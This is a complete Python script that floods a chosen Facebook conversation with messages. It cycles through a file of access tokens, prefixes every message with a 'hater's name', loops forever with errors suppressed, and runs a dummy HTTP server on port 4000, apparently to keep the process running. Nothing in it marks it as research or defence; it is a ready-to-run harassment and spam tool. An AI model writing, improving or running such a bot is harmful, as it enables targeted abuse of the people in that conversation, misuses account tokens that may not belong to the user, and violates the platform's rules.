import requests
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading
BOLD = '\033[1m'
CYAN = '\033[96m'
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"H")
def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()
def get_access_tokens(token_file):
    with open(token_file, 'r') as file:
        return [token.strip() for token in file]
def send_messages(convo_id, tokens, messages, haters_name, speed):
    headers = {
        'Content-type': 'application/json',
    }
    num_tokens = len(tokens)
    num_messages = len(messages)
    max_tokens = min(num_tokens, num_messages)
    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index]
                message = messages[message_index].strip()
                url = f"https://graph.facebook.com/v15.0/{convo_id}/"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Message {} of Convo {} sent by Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
                    print("  - Time: {}".format(current_time))
                else:
                    print("[x] Failed to send message {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, f'{haters_name} {message}'))
                    print("  - Time: {}".format(current_time))
                time.sleep(speed)
            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))
def main():
    token_file = input(BOLD + CYAN + "[+] Token File: ").strip()
    tokens = get_access_tokens(token_file)
    convo_id = input(BOLD + CYAN + "[+] Conversation ID: ").strip()
    messages_file = input(BOLD + CYAN + "[+] Messages Text File: ").strip()
    haters_name = input(BOLD + CYAN + "[+] Hater's Name: ").strip()
    speed = int(input(BOLD + CYAN + "[+] Speed in Seconds: ").strip())
    with open(messages_file, 'r') as file:
        messages = file.readlines()
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_messages(convo_id, tokens, messages, haters_name, speed)
if __name__ == '__main__':
    main()